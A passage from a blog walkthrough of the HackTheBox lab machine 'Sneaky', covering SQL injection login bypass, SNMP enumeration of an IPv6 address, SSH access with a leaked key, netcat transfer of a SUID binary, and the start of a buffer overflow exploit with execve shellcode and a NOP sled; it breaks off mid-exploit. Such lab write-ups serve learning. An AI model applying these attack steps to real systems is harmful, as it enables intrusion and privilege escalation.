---
title: "Walk-through of Sneaky from HackTheBox"
header: 
  teaser: /assets/images/2020-05-31-20-16-14.png
toc: true
toc_sticky: true
excerpt_separator:  <!--more-->
categories:
  - CTF
tags:
  - HTB
  - CTF
  - SNMP
  - snmpwalk
  - SQLi
  - buffer_overflow
  - Linux
---

## Machine Information

![sneaky](/assets/images/2020-05-31-20-16-14.png)

Sneaky introduces IPv6 enumeration through SNMP, and a fairly simple buffer overflow vulnerability needed to get to root. Skills required are intermediate level knowledge of Linux, and a basic understanding of SNMP. Skills learned are basic SQL injections, enumerating SNMP, exploiting SUID files and buffer overflow techniques.
<!--more-->

| Details |  |
| --- | --- |
| Hosting Site | [HackTheBox](https://www.hackthebox.eu/) |
| Link To Machine | [HTB - 019 - Medium - Sneaky](https://www.hackthebox.eu/home/machines/profile/19) |
| Machine Release Date | 14th May 2017 |
| Date I Completed It | 30th May 2020 |
| Distribution used | Kali 2020.1 – [Release Info](https://www.kali.org/releases/kali-linux-2020-1-release/) |

## Initial Recon

Start as normal with Nmap:

```text
root@kali:~/htb/sneaky# ports=$(nmap -p- --min-rate=1000 -T4 10.10.10.20 | grep ^[0-9] | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
root@kali:~/htb/sneaky# nmap -p$ports -v -sC -sV -oA sneaky 10.10.10.20

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 15:25 BST
Initiating Ping Scan at 15:25
Scanning 10.10.10.20 [4 ports]
Completed Ping Scan at 15:25, 0.06s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 15:25
Completed Parallel DNS resolution of 1 host. at 15:25, 0.02s elapsed
Initiating SYN Stealth Scan at 15:25
Scanning 10.10.10.20 [1 port]
Discovered open port 80/tcp on 10.10.10.20
Completed SYN Stealth Scan at 15:25, 0.06s elapsed (1 total ports)
Initiating Service scan at 15:25
Scanning 1 service on 10.10.10.20
Completed Service scan at 15:25, 6.06s elapsed (1 service on 1 host)
Nmap scan report for 10.10.10.20
Host is up (0.027s latency).
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: Under Development!
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.84 seconds
           Raw packets sent: 5 (196B) | Rcvd: 199 (48.316KB)
```

Just port 80 open, go have a look:

![under_development](/assets/images/2020-05-31-20-29-16.png)

Nothing there, check source code:

![source](/assets/images/2020-05-31-20-29-41.png)

Nothing there, try gobuster to see if anything hidden:

```text
root@kali:~/htb/sneaky# gobuster -t 100 dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.20

===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.20
[+] Threads:        100
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/28 15:24:50 Starting gobuster
===============================================================
/dev (Status: 301)
/server-status (Status: 403)
===============================================================
2020/05/28 15:26:05 Finished
===============================================================
```

Find a folder called dev, go have a look:

![members_area](/assets/images/2020-05-31-20-30-19.png)

Just a login box, source shows nothing interesting. Trying obvious creds like admin:admin etc gets us nowhere, set proxy to Burp and send it over:

![login](/assets/images/2020-05-31-20-30-57.png)

Captured in Burp so we can have a look:

![burp_intercept](/assets/images/2020-05-31-20-31-22.png)

Send over to Repeater to play with it:

![burp_repeater](/assets/images/2020-05-31-20-31-49.png)

Response to admin:admin is not found, try sending bad characters to see what happens:

![burp_repeater2](/assets/images/2020-05-31-20-32-12.png)

Server error, suggests it may be vulnerable to SQL injection, check it out with Intruder:

![burp_intruder](/assets/images/2020-05-31-20-32-54.png)

Create SQLi list if we haven't got one already using [this](https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet).

Load list in to Payloads:

![burp_payloads](/assets/images/2020-05-31-20-33-25.png)

Make sure variables are set for Burp to try the payloads against:

![burp_intruder2](/assets/images/2020-05-31-20-33-51.png)

Hit Start Attack and wait for output:

![burp_attack](/assets/images/2020-05-31-20-34-30.png)

A couple of lines such as number 12 have a response that's different to others. It has status 200 and longer length, which means more data was returned. Have a look at response:

![burp_response](/assets/images/2020-05-31-20-48-13.png)

We have a page with two names, admin and thrasivoulos. So confirms the site is vulnerable to SQLi, go have a look in browser using payload from above:

![website_login](/assets/images/2020-05-31-20-49-38.png)

We get to a page with a link to an RSA key:

![rsa_key](/assets/images/2020-05-31-20-50-11.png)

Paste the key in to a file and chmod to 400:

```text
root@kali:~/htb/sneaky# nano rsa.key
root@kali:~/htb/sneaky# chmod 400 rsa.key
```

## Gaining Access

Checking back to Nmap scan we didn't see port 22 open on TCP, check if we missed anything on UDP:

```text
root@kali:~/htb/sneaky# nmap -sU 10.10.10.20
Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 16:10 BST
Nmap scan report for 10.10.10.20
Host is up (0.023s latency).
Not shown: 999 closed ports
PORT    STATE SERVICE
161/udp open  snmp
```

SNMP is open, have a look with snmpwalk:

```text
root@kali:~/htb/sneaky# snmpwalk -c public -v2c 10.10.10.20
iso.3.6.1.2.1.1.1.0 = STRING: "Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (297734) 0:49:37.34
iso.3.6.1.2.1.1.4.0 = STRING: "root"
iso.3.6.1.2.1.1.5.0 = STRING: "Sneaky"
iso.3.6.1.2.1.1.6.0 = STRING: "Unknown"
iso.3.6.1.2.1.1.8.0 = Timeticks: (1) 0:00:00.01
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
<SNIP>
iso.3.6.1.2.1.4.34.1.8.1.4.10.10.10.20 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.4.34.1.8.1.4.10.10.10.255 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.4.34.1.8.1.4.127.0.0.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.4.34.1.8.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = Timeticks: (0) 0:00:00.00
iso.3.6.1.2.1.4.34.1.8.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.185.18.18 = Timeticks: (3002) 0:00:30.02
iso.3.6.1.2.1.4.34.1.8.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.185.18.18 = Timeticks: (0) 0:00:00.00
```

First three here are obviously IPv4, last three are IPv6 but in decimal not hex. Can see easier by filtering on just the IP-MIB 1.3.6.1.2.1.4.34.1.3:

```text
root@kali:~/htb/sneaky# snmpwalk -c public -v2c 10.10.10.20 1.3.6.1.2.1.4.34.1.3
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.20 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.10.10.10.255 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.1.4.127.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.0.0.0.0.0.0.0.0.0.0.0.0.0.0.0.1 = INTEGER: 1
iso.3.6.1.2.1.4.34.1.3.2.16.222.173.190.239.0.0.0.0.2.80.86.255.254.185.18.18 = INTEGER: 2
iso.3.6.1.2.1.4.34.1.3.2.16.254.128.0.0.0.0.0.0.2.80.86.255.254.185.18.18 = INTEGER: 2
```

Can use Enyx to convert from decimal to hex:

```text
root@kali:~/htb/sneaky# wget https://raw.githubusercontent.com/trickster0/Enyx/master/enyx.py

--2020-05-28 16:22:44--  https://raw.githubusercontent.com/trickster0/Enyx/master/enyx.py
Resolving raw.githubusercontent.com (raw.githubusercontent.com)... 199.232.56.133
Connecting to raw.githubusercontent.com (raw.githubusercontent.com)|199.232.56.133|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: 2613 (2.6K) [text/plain]
Saving to: ‘enyx.py’
enyx.py                         100%[====================================================>]   2.55K  --.-KB/s    in 0s
2020-05-28 16:22:44 (59.0 MB/s) - ‘enyx.py’ saved [2613/2613]
```

Run Enyx to get us the IPv6 address:

```text
root@kali:~/htb/sneaky# python enyx.py 2c public 10.10.10.20

###################################################################################
#                                                                                 #
#                      #######     ##      #  #    #  #    #                      #
#                      #          #  #    #    #  #    #  #                       #
#                      ######    #   #   #      ##      ##                        #
#                      #        #    # #        ##     #  #                       #
#                      ######  #     ##         ##    #    #                      #
#                                                                                 #
#                           SNMP IPv6 Enumerator Tool                             #
#                                                                                 #
#                   Author: Thanasis Tserpelis aka Trickster0                     #
#                                                                                 #
###################################################################################
[+] Snmpwalk found.
[+] Grabbing IPv6.
[+] Loopback -> 0000:0000:0000:0000:0000:0000:0000:0001
[+] Unique-Local -> dead:beef:0000:0000:0250:56ff:feb9:1212
[+] Link Local -> fe80:0000:0000:0000:0250:56ff:feb9:1212
```

Another way to get the IPv6 address is to edit /etx/snmp/snmp.conf and comment out the mibs line:

![snmp.conf](/assets/images/2020-05-31-20-53-27.png)

Install the mibs package:

```text
root@kali:~/htb/sneaky# apt install snmp-mibs-downloader
```

Then run snmpwalk again, but now it's much more readable:

```text
root@kali:~/htb/sneaky# snmpwalk -c public -v2c 10.10.10.20

SNMPv2-MIB::sysDescr.0 = STRING: Linux Sneaky 4.4.0-75-generic #96~14.04.1-Ubuntu SMP Thu Apr 20 11:06:56 UTC 2017 i686
SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (564877) 1:34:08.77
SNMPv2-MIB::sysContact.0 = STRING: root
SNMPv2-MIB::sysName.0 = STRING: Sneaky
SNMPv2-MIB::sysLocation.0 = STRING: Unknown
SNMPv2-MIB::sysORLastChange.0 = Timeticks: (1) 0:00:00.01
SNMPv2-MIB::sysORID.1 = OID: SNMP-MPD-MIB::snmpMPDCompliance
SNMPv2-MIB::sysORID.2 = OID: SNMP-USER-BASED-SM-MIB::usmMIBCompliance
SNMPv2-MIB::sysORID.3 = OID: SNMP-FRAMEWORK-MIB::snmpFrameworkMIBCompliance
SNMPv2-MIB::sysORID.4 = OID: SNMPv2-MIB::snmpMIB
SNMPv2-MIB::sysORID.5 = OID: TCP-MIB::tcpMIB
SNMPv2-MIB::sysORID.6 = OID: IP-MIB::ip
SNMPv2-MIB::sysORID.7 = OID: UDP-MIB::udpMIB
SNMPv2-MIB::sysORID.8 = OID: SNMP-VIEW-BASED-ACM-MIB::vacmBasicGroup
SNMPv2-MIB::sysORID.9 = OID: SNMP-NOTIFICATION-MIB::snmpNotifyFullCompliance
SNMPv2-MIB::sysORID.10 = OID: NOTIFICATION-LOG-MIB::notificationLogMIB
SNMPv2-MIB::sysORDescr.1 = STRING: The MIB for Message Processing and Dispatching.
SNMPv2-MIB::sysORDescr.2 = STRING: The management information definitions for the SNMP User-based Security Model.
SNMPv2-MIB::sysORDescr.3 = STRING: The SNMP Management Architecture MIB.
SNMPv2-MIB::sysORDescr.4 = STRING: The MIB module for SNMPv2 entities
<SNIP>
IP-MIB::ipAddressStatus.ipv4."10.10.10.20" = INTEGER: preferred(1)
IP-MIB::ipAddressStatus.ipv4."10.10.10.255" = INTEGER: preferred(1)
IP-MIB::ipAddressStatus.ipv4."127.0.0.1" = INTEGER: preferred(1)
IP-MIB::ipAddressStatus.ipv6."00:00:00:00:00:00:00:00:00:00:00:00:00:00:00:01" = INTEGER: preferred(1)
IP-MIB::ipAddressStatus.ipv6."de:ad:be:ef:00:00:00:00:02:50:56:ff:fe:b9:12:12" = INTEGER: preferred(1)
IP-MIB::ipAddressStatus.ipv6."fe:80:00:00:00:00:00:00:02:50:56:ff:fe:b9:12:12" = INTEGER: preferred(1)
```

We now have the IPv6 address so can try to ping it:

```text
root@kali:~/htb/sneaky# ping dead:beef:0000:0000:0250:56ff:feb9:1212

PING dead:beef:0000:0000:0250:56ff:feb9:1212(dead:beef::250:56ff:feb9:1212) 56 data bytes
64 bytes from dead:beef::250:56ff:feb9:1212: icmp_seq=1 ttl=63 time=74.2 ms
64 bytes from dead:beef::250:56ff:feb9:1212: icmp_seq=2 ttl=63 time=26.6 ms
64 bytes from dead:beef::250:56ff:feb9:1212: icmp_seq=3 ttl=63 time=82.2 ms
--- dead:beef:0000:0000:0250:56ff:feb9:1212 ping statistics ---
3 packets transmitted, 3 received, 0% packet loss, time 2011ms
rtt min/avg/max/mdev = 26.615/60.982/82.170/24.520 ms
```

And can scan to see if ssh is open on port 22 on IPv6:

```text
root@kali:~/htb/sneaky# nmap -Pn -p22 -6 dead:beef:0000:0000:0250:56ff:feb9:1212

Starting Nmap 7.80 ( https://nmap.org ) at 2020-05-28 17:00 BST
Nmap scan report for dead:beef::250:56ff:feb9:1212
Host is up (0.023s latency).
PORT   STATE SERVICE
22/tcp open  ssh
Nmap done: 1 IP address (1 host up) scanned in 0.24 seconds
```

Success, we can now try to get in using the rsa key we found earlier:

```text
root@kali:~/htb/sneaky# ssh -i rsa.key admin@dead:beef::250:56ff:feb9:1212
admin@dead:beef::250:56ff:feb9:1212: Permission denied (publickey).
```

Key isn't for admin user, try the other account we found:

```text
root@kali:~/htb/sneaky# ssh -i rsa.key thrasivoulos@dead:beef::250:56ff:feb9:1212

The authenticity of host 'dead:beef::250:56ff:feb9:1212 (dead:beef::250:56ff:feb9:1212)' can't be established.
ECDSA key fingerprint is SHA256:KCwXgk+ryPhJU+UhxyHAO16VCRFrty3aLPWPSkq/E2o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'dead:beef::250:56ff:feb9:1212' (ECDSA) to the list of known hosts.
Welcome to Ubuntu 14.04.5 LTS (GNU/Linux 4.4.0-75-generic i686)
  System information as of Thu May 28 17:25:00 EEST 2020
  System load: 0.0               Memory usage: 4%   Processes:       178
  Usage of /:  9.9% of 18.58GB   Swap usage:   0%   Users logged in: 0
Last login: Sun May 14 20:22:53 2017 from dead:beef:1::1077
```

## User Flag

We are in, check who and where we are:

```text
thrasivoulos@Sneaky:~$ id
uid=1000(thrasivoulos) gid=1000(thrasivoulos) groups=1000(thrasivoulos),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lpadmin),111(sambashare)
thrasivoulos@Sneaky:~$ pwd
/home/thrasivoulos
thrasivoulos@Sneaky:~$ ls
user.txt
```

Grab flag while we're here:

```text
thrasivoulos@Sneaky:~$ cat user.txt
<<HIDDEN>>
```

Now on to priv esc, check for unusual SUID binaries:

```text
thrasivoulos@Sneaky:~$ find / -perm -4000 2>/dev/null

/bin/umount
/bin/su
/bin/mount
/bin/ping6
/bin/fusermount
/bin/ping
/usr/local/bin/chal
/usr/sbin/uuidd
/usr/sbin/pppd
/usr/bin/at
/usr/bin/pkexec
/usr/bin/traceroute6.iputils
<SNIP>
```

We see an unusual file called chal, check it out:

```text
hrasivoulos@Sneaky:~$ file /usr/local/bin/chal
/usr/local/bin/chal: setuid, setgid ELF 32-bit LSB  executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=fc8ad06fcfafe1fbc2dbaa1a65222d685b047b11, not stripped
```

It's a 32bit binary, try running it:

```text
thrasivoulos@Sneaky:~$ /usr/local/bin/chal
Segmentation fault (core dumped)
```

Core dump, suggests it's a classic buffer overflow exploit needed. First get it to Kali to have a look what security is enabled on it:

```text
root@kali:~/htb/sneaky# nc -lnvp 1234 > chal.b64
listening on [any] 1234 ...
```

Over on the box base64 encode and send it over:

```text
thrasivoulos@Sneaky:~$ base64 /usr/local/bin/chal | nc 10.10.14.14 1234
```

Now back on Kali we need to decode it:

```text
root@kali:~/htb/sneaky# base64 -d chal.b64 > chal
```

Install checksec if not already there:

```text
root@kali:~/htb/sneaky# apt install checksec
Reading package lists... Done
Building dependency tree
Reading state information... Done
The following NEW packages will be installed:
  checksec
0 upgraded, 1 newly installed, 0 to remove and 112 not upgraded.
Need to get 24.5 kB of archives.
After this operation, 108 kB of additional disk space will be used.
Get:1 http://kali.download/kali kali-rolling/main amd64 checksec all 2.1.0+git20191113.bf85698-2 [24.5 kB]
Fetched 24.5 kB in 0s (54.5 kB/s)
Selecting previously unselected package checksec.
(Reading database ... 317549 files and directories currently installed.)
Preparing to unpack .../checksec_2.1.0+git20191113.bf85698-2_all.deb ...
Unpacking checksec (2.1.0+git20191113.bf85698-2) ...
Setting up checksec (2.1.0+git20191113.bf85698-2) ...
Processing triggers for man-db (2.9.1-1) ...
Processing triggers for kali-menu (2020.2.2) ...
Scanning processes...
Scanning linux images...
No user sessions are running outdated binaries.
```

Now use it to check security on binary:

```text
root@kali:~/htb/sneaky# checksec --file=chal
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   67 Symbols     No       0               1       chal
```

So confirms nothing is enabled to make exploiting the buffer overflow difficult. It's 32bit so can't use gdb on my 64bit Kali, check back on box:

```text
thrasivoulos@Sneaky:~$ which gdb
/usr/bin/gdb
```

## Privilege Escalation

Excellent, gdb is already on there, so back to box and find what input causes the seg fault:

```text
thrasivoulos@Sneaky:~$ /usr/local/bin/chal
Segmentation fault (core dumped)
thrasivoulos@Sneaky:~$ /usr/local/bin/chal a
thrasivoulos@Sneaky:~$ /usr/local/bin/chal aaaaaa
thrasivoulos@Sneaky:~$ /usr/local/bin/chal aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
thrasivoulos@Sneaky:~$ /usr/local/bin/chal aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
thrasivoulos@Sneaky:~$ /usr/local/bin/chal aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
thrasivoulos@Sneaky:~$ /usr/local/bin/chal aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Segmentation fault (core dumped)
```

So it's somewhere between one char and a whole load of chars. Use the MSF pattern_create.rb to get us a unique pattern:

```text
root@kali:~/htb/sneaky# locate pattern_create
/usr/bin/msf-pattern_create
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb
root@kali:~/htb/sneaky# /usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 400
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
```

Copy this pattern to box and check it is enough to cause a seg fault:

```text
thrasivoulos@Sneaky:~$ /usr/local/bin/chal Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
Segmentation fault (core dumped)
```

Works, so can now use gdb:

```text
hrasivoulos@Sneaky:~$ gdb /usr/local/bin/chal
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "i686-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/local/bin/chal...(no debugging symbols found)...done.
(gdb) r Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A
Starting program: /usr/local/bin/chal Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A

Program received signal SIGSEGV, Segmentation fault.
0x316d4130 in ?? ()
(gdb)
```

So we did r to run, and the unique string, which caused a seg fault and gdb returned the address of the string that was in the buffer at that point. Now back to Kali to find where in our unique string that was:

```text
root@kali:~/htb/sneaky# /usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x316d4130
[*] Exact match at offset 362
```

Now we know the buffer space is 362, and can start to build our exploit script:

```text
buffsize = 362
```

Let's grab the shellcode we want to execute when the buffer overflow is triggered. To get our privilege escalation we want to spawn a shell in the systems context. Head over to packetstorm to find one of their's [here.](https://packetstormsecurity.com/files/115010/Linux-x86-execve-bin-sh-Shellcode.html)

From there we find this shellcode : "\x31\xc0\x50\x68\x2f\x2f\x73", "\x68\x68\x2f\x62\x69\x6e\x89", "\xe3\x89\xc1\x89\xc2\xb0\x0b", "\xcd\x80\x31\xc0\x40\xcd\x80";

Put that in our script:

```text
buffsize = 362
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
```

Next we need to define the NOP-sled, brloe is a good explanation of what that is taken from [here](https://www.coengoedegebure.com/buffer-overflow-attacks-explained).

**A NOP-sled is a sequence of NOP (no-operation) instructions meant to "slide" the CPU's instruction execution flow to the next memory address. Anywhere the return address lands in the NOP-sled, it's going to slide along the buffer until it hits the start of the shellcode. NOP-values may differ per CPU, but for the OS and CPU we're aiming at, the NOP-value is \x90.
**

The formula for the nopsled is "\x90"*(buffsize-len(shellcode)), let's put that in our script:

```text
buffsize = 362
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
nopsled = "\x90"*(buffsize-len(shellcode))
```

Next we need to find the EIP, from the same article above, here is the description of the EIP:
The EIP (Extended Instruction Pointer) contains the address of the next instruction to be executed, which now points to the faulty address.

We want to know what that address is so we can line our payload up. To find it we run gdb again and cause the buffer overflow:

```text
thrasivoulos@Sneaky:~$ gdb /usr/local/bin/chal
GNU gdb (Ubuntu 7.7.1-0ubuntu5~14.04.2) 7.7.1
Copyright (C) 2014 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
